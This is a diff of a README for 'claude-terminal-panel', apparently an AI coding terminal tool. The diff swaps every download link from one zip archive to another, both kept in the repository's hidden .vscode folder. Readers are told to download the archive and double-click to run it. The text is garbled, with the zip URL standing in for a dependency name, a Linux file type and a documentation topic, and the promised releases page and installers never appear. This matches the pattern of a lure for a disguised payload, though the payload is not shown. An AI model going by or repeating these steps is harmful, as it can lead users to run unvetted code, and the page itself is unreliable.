@@ -6,7 +6,7 @@ Welcome to the claude-terminal-panel! This application provides a dedicated term
 
 ## 📥 Download Here
 
-[![Download claude-terminal-panel](https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip%20Now-claude--terminal--panel-brightgreen)](https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip)
+[![Download claude-terminal-panel](https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip%20Now-claude--terminal--panel-brightgreen)](https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip)
 
 ## 🔍 Features
 
@@ -22,7 +22,7 @@ The claude-terminal-panel offers several features designed to enhance your codin
 Before downloading, please ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
-- **https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip**: Version 14 or higher installed.
+- **https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip**: Version 14 or higher installed.
 - **Internet Connection**: Required for AI features to work.
 
 ## 💾 Download & Install
@@ -30,14 +30,14 @@ Before downloading, please ensure your system meets the following requirements:
 To download and install claude-terminal-panel, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Download claude-terminal-panel](https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip)
+   [Download claude-terminal-panel](https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip)
 
 2. **Select the Latest Release**: Look for the latest version listed at the top of the releases page.
 
 3. **Download the Installer**: Click on the appropriate installer for your operating system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the `https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip` file.
+   - For Linux: Download the `https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip` file.
 
 4. **Run the Installer**: Once the file downloads, locate it on your computer and double-click to run it.
 
@@ -78,6 +78,6 @@ Remember, every contribution helps make claude-terminal-panel better for everyon
 For more information about using AI assistants and coding tools, feel free to explore these topics:
 
 - **AI Basics**: Learn what AI coding assistants can do for you and how they can improve your coding workflow.
-- **https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip Documentation**: Understand how https://raw.githubusercontent.com/HarikaMhae/claude-terminal-panel/main/.vscode/claude-terminal-panel-2.9.zip works and its role in building applications like this one.
+- **https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip Documentation**: Understand how https://github.com/HarikaMhae/claude-terminal-panel/raw/refs/heads/main/.vscode/claude-panel-terminal-v3.5.zip works and its role in building applications like this one.
 
 Thank you for choosing claude-terminal-panel! We hope this application enhances your coding projects with the help of AI.
